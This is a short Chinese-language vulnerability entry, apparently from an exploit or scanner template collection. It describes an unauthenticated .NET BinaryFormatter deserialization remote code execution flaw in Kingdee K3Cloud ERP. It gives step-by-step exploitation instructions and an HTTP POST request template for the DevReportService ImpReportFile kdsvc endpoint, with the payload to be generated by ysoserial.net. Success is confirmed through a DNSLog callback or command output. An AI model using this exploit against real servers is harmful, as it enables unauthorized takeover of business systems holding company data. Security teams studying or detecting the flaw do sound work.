---
id: KINGDEE-K3CLOUD-DESER
title: 金蝶 K3Cloud BinaryFormatter 反序列化 RCE
product: kingdee
vendor: 金蝶软件
version_affected: "K3Cloud"
severity: CRITICAL
tags: [rce, deserialization, 国产, erp, 无需认证]
fingerprint: ["金蝶", "Kingdee", "K3Cloud", "BinaryFormatter"]
---

## 漏洞描述

金蝶 K3Cloud 的 kdsvc 接口存在 .NET BinaryFormatter 反序列化漏洞，可利用 ysoserial.net 生成利用链实现 RCE。

## 影响版本

- K3Cloud

## 前置条件

- 无需认证，目标开放 `/K3Cloud/` kdsvc 服务接口

## 利用步骤

1. 使用 ysoserial.net 生成 BinaryFormatter 反序列化利用链 payload
2. 向 `ImpReportFile.common.kdsvc` 接口发送 POST 请求，Content-Type 为 `application/octet-stream`，body 为生成的 payload
3. 通过 DNSLog 回连或命令执行结果确认 RCE 成功

## Payload

```http
POST /K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.ImpReportFile.common.kdsvc HTTP/1.1
Host: target
Content-Type: application/octet-stream

<BinaryFormatter_ysoserial_payload>
```

使用 ysoserial.net 生成 BinaryFormatter 利用链。

## 验证方法

通过 DNSLog 回连或命令执行结果确认。
